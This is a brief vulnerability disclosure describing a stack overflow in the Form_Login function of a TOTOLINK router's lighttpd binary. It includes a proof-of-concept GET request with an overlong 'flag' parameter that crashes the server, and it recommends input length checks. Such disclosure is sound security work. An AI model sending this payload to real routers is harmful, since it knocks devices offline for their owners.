## Vulnerability description

We found an stack overflow vulnerability  in TOTOLINK Technology router with firmware which was released recentlyï¼Œallows remote attackers to crash the server.

**Stack Overflow**

In `lighttpd` binary:

In `Form_Login` function, `flag` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow,so we can control the `flag` to crash the server.

**Supplement**

in the program. In order to avoid such problems, we believe that the string content should be checked in the input extraction part. For example, the length can be limited to only 2 and must be a number.



## PoC

We set `flag` as **aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa** , then sending GET request such as:

http://192.168.0.1/formLoginAuth.htm?action=login&flag=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

```http
GET /formLoginAuth.htm?action=login&flag=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
